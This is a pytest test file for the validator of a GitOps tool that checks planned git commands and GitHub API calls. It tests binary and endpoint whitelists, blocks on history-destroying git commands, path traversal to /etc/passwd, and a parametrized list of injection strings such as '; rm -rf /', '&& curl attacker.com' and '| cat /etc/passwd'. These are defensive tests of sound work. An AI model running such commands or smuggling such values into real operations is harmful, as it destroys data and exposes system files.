"""Tests for the multi-stage validation engine."""

from __future__ import annotations

from pathlib import Path

import pytest

from gitops_by_veera.exceptions import (
    CloudEndpointViolationError,
    CommandInjectionError,
    ForbiddenBinaryError,
    ForbiddenOperationError,
    PathTraversalError,
    SecurityViolationError,
)
from gitops_by_veera.models import CloudOperation, ExecutionPlan, LocalOperation
from gitops_by_veera.validator import (
    is_warning_operation,
    validate_cloud_operation,
    validate_local_operation,
    validate_plan,
)


# ---------------------------------------------------------------------------
# Local operation — binary whitelist
# ---------------------------------------------------------------------------


def test_allowed_binary_passes(fake_repo: Path) -> None:
    op = LocalOperation(
        type="local", binary="git", args=["status"], risk_level="safe", reason="ok"
    )
    validate_local_operation(op, fake_repo)


def test_forbidden_binary_raises(fake_repo: Path) -> None:
    op = LocalOperation(
        type="local", binary="curl", args=["-X", "POST"], risk_level="safe", reason="bad"
    )
    with pytest.raises(ForbiddenBinaryError):
        validate_local_operation(op, fake_repo)


def test_python_binary_blocked(fake_repo: Path) -> None:
    op = LocalOperation(
        type="local", binary="python", args=["evil.py"], risk_level="safe", reason="bad"
    )
    with pytest.raises(ForbiddenBinaryError):
        validate_local_operation(op, fake_repo)


# ---------------------------------------------------------------------------
# Local operation — blocked commands
# ---------------------------------------------------------------------------


def test_filter_branch_blocked(fake_repo: Path) -> None:
    op = LocalOperation(
        type="local",
        binary="git",
        args=["filter-branch", "--force"],
        risk_level="safe",
        reason="rewrite",
    )
    with pytest.raises(ForbiddenOperationError):
        validate_local_operation(op, fake_repo)


def test_reflog_expire_blocked(fake_repo: Path) -> None:
    op = LocalOperation(
        type="local",
        binary="git",
        args=["reflog", "expire", "--expire=now", "--all"],
        risk_level="safe",
        reason="clean",
    )
    with pytest.raises(ForbiddenOperationError):
        validate_local_operation(op, fake_repo)


def test_gc_prune_now_blocked(fake_repo: Path) -> None:
    op = LocalOperation(
        type="local",
        binary="git",
        args=["gc", "--prune=now"],
        risk_level="safe",
        reason="gc",
    )
    with pytest.raises(ForbiddenOperationError):
        validate_local_operation(op, fake_repo)


# ---------------------------------------------------------------------------
# Local operation — injection token detection
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "bad_arg",
    [
        "; rm -rf /",
        "&& curl attacker.com",
        "| cat /etc/passwd",
        "$(evil)",
        "`whoami`",
        "sudo git push",
        "bash -c 'id'",
    ],
)
def test_injection_token_blocked(bad_arg: str, fake_repo: Path) -> None:
    op = LocalOperation(
        type="local", binary="git", args=["commit", "-m", bad_arg], risk_level="safe", reason="x"
    )
    with pytest.raises(CommandInjectionError):
        validate_local_operation(op, fake_repo)


def test_cd_as_arg_blocked(fake_repo: Path) -> None:
    op = LocalOperation(
        type="local", binary="git", args=["cd", "/tmp"], risk_level="safe", reason="x"
    )
    with pytest.raises(CommandInjectionError):
        validate_local_operation(op, fake_repo)


# ---------------------------------------------------------------------------
# Local operation — path traversal
# ---------------------------------------------------------------------------


def test_path_traversal_outside_repo_blocked(fake_repo: Path) -> None:
    op = LocalOperation(
        type="local",
        binary="git",
        args=["add", "../../../etc/passwd"],
        risk_level="safe",
        reason="x",
    )
    with pytest.raises(PathTraversalError):
        validate_local_operation(op, fake_repo)


def test_path_within_repo_allowed(fake_repo: Path) -> None:
    op = LocalOperation(
        type="local",
        binary="git",
        args=["add", "src/main.py"],
        risk_level="safe",
        reason="ok",
    )
    validate_local_operation(op, fake_repo)


# ---------------------------------------------------------------------------
# Warning operations
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "args",
    [
        ["reset", "--hard"],
        ["clean", "-fd"],
        ["branch", "-D", "old-branch"],
        ["push", "--force"],
        ["push", "-f"],
        ["rebase", "main"],
        ["cherry-pick", "abc123"],
        ["stash", "clear"],
    ],
)
def test_warning_operations_detected(args: list[str]) -> None:
    op = LocalOperation(
        type="local", binary="git", args=args, risk_level="warning", reason="risky"
    )
    assert is_warning_operation(op) is True


def test_safe_operation_not_warning() -> None:
    op = LocalOperation(
        type="local", binary="git", args=["status"], risk_level="safe", reason="ok"
    )
    assert is_warning_operation(op) is False


# ---------------------------------------------------------------------------
# Cloud operation — endpoint whitelist
# ---------------------------------------------------------------------------


def test_allowed_endpoint_passes() -> None:
    op = CloudOperation(
        type="cloud",
        endpoint="/repos/owner/repo/pulls",
        method="POST",
        payload={"title": "PR", "head": "feat", "base": "main"},
        risk_level="safe",
        reason="ok",
    )
    validate_cloud_operation(op)


@pytest.mark.parametrize(
    "endpoint",
    [
        "/repos/owner/repo",
        "/repos/owner/repo/delete",
        "/admin/users",
        "/user/keys",
        "/notifications",
    ],
)
def test_blocked_endpoint_raises(endpoint: str) -> None:
    op = CloudOperation(
        type="cloud",
        endpoint=endpoint,
        method="POST",
        payload={},
        risk_level="safe",
        reason="bad",
    )
    with pytest.raises((CloudEndpointViolationError, SecurityViolationError)):
        validate_cloud_operation(op)


def test_delete_method_always_blocked() -> None:
    op = CloudOperation(
        type="cloud",
        endpoint="/repos/owner/repo/pulls",
        method="DELETE",  # type: ignore[arg-type]
        payload={},
        risk_level="safe",
        reason="bad",
    )
    with pytest.raises(SecurityViolationError):
        validate_cloud_operation(op)


@pytest.mark.parametrize(
    "endpoint, method",
    [
        ("/user/repos", "GET"),
        ("/user/repos", "POST"),
        ("/orgs/myorg/repos", "POST"),
        ("/repos/o/r/issues", "GET"),
        ("/repos/o/r/issues/42", "PATCH"),
        ("/repos/o/r/pulls", "POST"),
        ("/repos/o/r/pulls/1/merge", "PUT"),
        ("/repos/o/r/git/refs", "POST"),
        ("/repos/o/r/actions/workflows/deploy.yml/dispatches", "POST"),
    ],
)
def test_all_whitelisted_endpoints_pass(endpoint: str, method: str) -> None:
    op = CloudOperation(
        type="cloud",
        endpoint=endpoint,
        method=method,  # type: ignore[arg-type]
        payload={"ref": "main"},
        risk_level="safe",
        reason="ok",
    )
    validate_cloud_operation(op)


# ---------------------------------------------------------------------------
# Full plan validation
# ---------------------------------------------------------------------------


def test_validate_plan_raises_on_blocked_risk_level(fake_repo: Path) -> None:
    op = LocalOperation(
        type="local", binary="git", args=["status"], risk_level="blocked", reason="bad"
    )
    plan = ExecutionPlan(operations=[op])
    with pytest.raises(ForbiddenOperationError):
        validate_plan(plan, fake_repo)


def test_validate_plan_returns_warnings(fake_repo: Path) -> None:
    op = LocalOperation(
        type="local",
        binary="git",
        args=["reset", "--hard"],
        risk_level="warning",
        reason="risky",
    )
    plan = ExecutionPlan(operations=[op])
    warnings = validate_plan(plan, fake_repo)
    assert len(warnings) == 1
    assert "reset" in warnings[0]
